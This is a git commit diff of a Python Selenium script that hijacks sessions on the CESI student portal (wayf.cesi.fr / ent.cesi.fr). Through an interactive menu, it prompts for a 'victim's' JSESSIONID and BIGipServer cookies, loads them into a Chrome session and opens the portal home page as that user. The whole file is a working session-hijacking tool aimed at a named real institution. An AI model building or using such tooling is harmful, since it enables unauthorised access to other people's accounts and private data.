eb2d6c8e35f8b14448de0d3ec922f0fddc3d4018
Aypisam <the.aypisam.fpv@gmail.com>
2024-01-17 00:45:32 +0100

    updated cookie set in (1/2)

--- browser.py
+++ browser.py
@@ -1,119 +1,205 @@
 from selenium import webdriver
+from webdriver_manager.chrome import ChromeDriverManager
+import sys
 
 
-ent_cookies = [
-    {
-        'domain': 'wayf.cesi.fr',
-        'httpOnly': True,
-        'name': 'BIGipServer~ADMIN~pool-WAYF-https',
-        'path': '/',
-        'sameSite': 'Lax',
-        'secure': True,
-        'value': ''
-    },
-    {
-        'domain': 'wayf.cesi.fr',
-        'httpOnly': True,
-        'name': 'JSESSIONID',
-        'path': '/',
-        'sameSite': 'Lax',
-        'secure': True,
-        'value': ''
-    },
-    {
-        'domain': '.wayf.cesi.fr',
-        'expiry': 1738758386,
-        'httpOnly': False,
-        'name': '_pk_id.9.5fe9',
-        'path': '/',
-        'sameSite': 'Lax',
-        'secure': True,
-        'value': ''
-    },
-    {
-        'domain': '.wayf.cesi.fr',
-        'expiry': 1704804986,
-        'httpOnly': False,
-        'name': '_pk_ses.9.5fe9',
-        'path': '/',
-        'sameSite': 'Lax',
-        'secure': True,
-        'value': ''
-    },
-    {
-        'domain': '.wayf.cesi.fr',
-        'expiry': 1738758386,
-        'httpOnly': False,
-        'name': '_pk_id.9.5fe9',
-        'path': '/',
-        'sameSite': 'Lax',
-        'secure': True,
-        'value': ''
-    },
-    {
-        'domain': '.wayf.cesi.fr',
-        'expiry': 1704804986,
-        'httpOnly': False,
-        'name': '_pk_ses.9.5fe9',
-        'path': '/',
-        'sameSite': 'Lax',
-        'secure': True,
-        'value': ''
-    }
-]
+
+
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+
+prompt = f"\n{bcolors.OKCYAN}>>> {bcolors.ENDC}"
+help_msg =  f" - Enter {bcolors.OKCYAN}load{bcolors.ENDC} to load page\n"
+help_msg += f" - Enter {bcolors.OKCYAN}ent{bcolors.ENDC} to load the ent\n"
+help_msg += f" - Enter {bcolors.OKCYAN}get_cookies{bcolors.ENDC} to get the current cookies from the browser page\n"
+help_msg += f" - Enter {bcolors.OKCYAN}set_cookies{bcolors.ENDC} to set the cookies\n"
+help_msg += f" - Enter {bcolors.OKCYAN}reload{bcolors.ENDC} to reload the page\n"
+help_msg += f" - Enter {bcolors.OKCYAN}exit{bcolors.ENDC} to exit the program\n"
+
+
+def terminal_print(mess:str):
+    print(f"{mess}{bcolors.ENDC}")
+
+
+# ent_cookies = [
+#     {
+#         'domain': 'wayf.cesi.fr',
+#         'httpOnly': True,
+#         'name': 'BIGipServer~ADMIN~pool-WAYF-https',
+#         'path': '/',
+#         'sameSite': 'Lax',
+#         'secure': True,
+#         'value': ''
+#     },
+#     {
+#         'domain': 'wayf.cesi.fr',
+#         'httpOnly': True,
+#         'name': 'JSESSIONID',
+#         'path': '/',
+#         'sameSite': 'Lax',
+#         'secure': True,
+#         'value': ''
+#     },
+#     {
+#         'domain': '.wayf.cesi.fr',
+#         'expiry': 1738758386,
+#         'httpOnly': False,
+#         'name': '_pk_id.9.5fe9',
+#         'path': '/',
+#         'sameSite': 'Lax',
+#         'secure': True,
+#         'value': ''
+#     },
+#     {
+#         'domain': '.wayf.cesi.fr',
+#         'expiry': 1704804986,
+#         'httpOnly': False,
+#         'name': '_pk_ses.9.5fe9',
+#         'path': '/',
+#         'sameSite': 'Lax',
+#         'secure': True,
+#         'value': ''
+#     },
+#     {
+#         'domain': '.wayf.cesi.fr',
+#         'expiry': 1738758386,
+#         'httpOnly': False,
+#         'name': '_pk_id.9.5fe9',
+#         'path': '/',
+#         'sameSite': 'Lax',
+#         'secure': True,
+#         'value': ''
+#     },
+#     {
+#         'domain': '.wayf.cesi.fr',
+#         'expiry': 1704804986,
+#         'httpOnly': False,
+#         'name': '_pk_ses.9.5fe9',
+#         'path': '/',
+#         'sameSite': 'Lax',
+#         'secure': True,
+#         'value': ''
+#     }
+# ]
+
+
+
 
 ent_url = "https://wayf.cesi.fr/login?service=https%3A%2F%2Fent.cesi.fr%2Fservlet%2Fcom.jsbsoft.jtf.core.SG%3FPROC%3DIDENTIFICATION_FRONT"
 ent_accueil_url = "https://ent.cesi.fr/accueil-apprenant"
 
 
-print("please enter victim's cookies : ")
+def get_cookies(driver: webdriver.Chrome):
+    """Get the cookies from the browser page and print them in the terminal"""
+    cookies = driver.get_cookies()
+    terminal_print(f"\n{bcolors.HEADER}Cookies : ")
+    for cookie in cookies:
+        terminal_print(f"\t{bcolors.WARNING}{cookie['name']}{bcolors.ENDC} : {bcolors.OKBLUE}{cookie['value']}")
 
 
-BIGipServer = input("BIGipServer~ADMIN~pool-WAYF-https > ").replace(' ', '')
-JSESSIONID = input("JSESSIONID > ").replace(' ', '')
+def set_cookies(driver: webdriver.Chrome):
+    """Set the cookies from the browser page and print them in the terminal"""
+    terminal_print(f"{bcolors.HEADER}please enter victim's cookies : ")
+
+    JSESSIONID = input(f"JSESSIONID :{prompt}").replace(' ', '')
+    BIGipServer = input(f"\nBIGipServer~ADMIN~pool-WAYF-https :{prompt}").replace(' ', '')
+
+    terminal_print(f"\n🔁 | {bcolors.OKBLUE}Setting cookies...\n")
+
+    JSESSIONID_cookie = {
+        'name': 'JSESSIONID',
+        'value': JSESSIONID
+    }
+    BIGipServer_cookie = {
+        'name': 'BIGipServer~ADMIN~pool-WAYF-https',
+        'value': BIGipServer
+    }
+
+
+    old_cookies = driver.get_cookies()
+    driver.delete_all_cookies()
+
+    terminal_print(f"🔁 | {bcolors.OKCYAN}loading ent page...")
+    driver.get(ent_url)
+
+    terminal_print(f"🔁 | {bcolors.OKCYAN}adding cookies...")
+    driver.add_cookie(JSESSIONID_cookie)
+    driver.add_cookie(BIGipServer_cookie)
+
+    terminal_print(f"🔁 | {bcolors.OKCYAN}reloading ent accueil page...")
+    driver.get(ent_accueil_url)
+
+
+    #check if cookies are set
+    cookies = driver.get_cookies()
+    for cookie in cookies:
+        if cookie['name'] == 'JSESSIONID':
+            if cookie['value'] != JSESSIONID:
+                terminal_print(f"\n❌ | {bcolors.FAIL}Error while setting cookies JSESSIONID : {bcolors.OKBLUE}{cookie['value']} {bcolors.FAIL}should be {bcolors.OKBLUE}{JSESSIONID}")
+            else:
+                terminal_print(f"\n✅ | {bcolors.OKGREEN}Cookies JSESSIONID set !")
+
+        elif cookie['name'] == 'BIGipServer~ADMIN~pool-WAYF-https':
+            if cookie['value'] != BIGipServer:
+                terminal_print(f"\n❌ | {bcolors.FAIL}Error while setting cookies BIGipServer : {bcolors.OKBLUE}{cookie['value']} {bcolors.FAIL}should be {bcolors.OKBLUE}{BIGipServer}")
+            else:
+                terminal_print(f"\n✅ | {bcolors.OKGREEN}Cookies BIGipServer set !")
+
+    get_cookies(driver)
+            
+    return driver
 
 
 
-print("🚀 | Launching browser...")
-driver = webdriver.Chrome()
-print("✅ | Browser launched !\n")
+if __name__ == "__main__":
+    terminal_print(f"🚀 | {bcolors.HEADER}Launching browser...")
+    driver = webdriver.Chrome(ChromeDriverManager().install())
+    while True:
+        input_ = input(f"\n{help_msg}\n{prompt}").lower()
+        
+        if input_.startswith('load'):
+            url = input_.replace('load', '')
+            try:
+                url = url.split(' ')[1]
+                driver.get(url.replace(' ', ''))
+                terminal_print(f"✅ | {bcolors.OKGREEN}Page {url} loaded !")
+            except Exception as e:
+                #if error is indedx error
+                if str(e).startswith('list index out of range'):
+                    terminal_print(f"❌ | {bcolors.FAIL}Error while loading page {url} : No url provided !")
+                elif "https://" not in url:
+                    terminal_print(f"❌ | {bcolors.FAIL}Error while loading page {url} : Invalid url !")
+                else:
+                    terminal_print(f"❌ | {bcolors.FAIL}Error while loading page {url} : {e}")
+                
 
+        elif input_ == 'get_cookies':
+            cookies = get_cookies(driver)
 
+        elif input_ == 'set_cookies':
+            driver = set_cookies(driver)
+        
+        elif input_ == 'exit':
+            driver.quit()
+            sys.exit()
 
+        elif input_ == 'ent':
+            driver.get(ent_url)
 
-print("🔁 | Setting cookies...")
+        elif input_ == 'reload':
+            driver.refresh()
 
-driver.delete_all_cookies()
-good = True
+        else:
+            terminal_print(f"❌ | {bcolors.WARNING}Unknown command !")
 
-for cookie in ent_cookies:
-    if cookie['name'] == 'BIGipServer~ADMIN~pool-WAYF-https':
-        cookie['value'] = BIGipServer
-    elif cookie['name'] == 'JSESSIONID':
-        cookie['value'] = JSESSIONID
-    else:
-        continue
+        print()
     
-    try:
-        driver.add_cookie(cookie)
-        print(f"\t🆗 | Cookie {cookie['name']} set to {cookie['value']}")
-    except Exception as e:
-        print(f"\t❌ | Error while setting cookie {cookie['name']} : {e}")
-        good = False
-    
-
-if good : print("✅ | Cookies set !\n\t", driver.get_cookies())
-else :
-    print("❌ | Error while setting cookies !")
-
-    try:
-        driver.add_cookie(cookie)
-        print(f"\t🆗 | Cookie {cookie['name']} set to {cookie['value']}")
-    except Exception as e:
-        print(f"\t❌ | Error while setting cookie {cookie['name']} : {e}")
-        good = False
-    
-
-print("✅ | Cookies set !\n\t", driver.get_cookies()) if good else print("❌ | Error while setting cookies !")
-
-driver.get(ent_accueil_url)
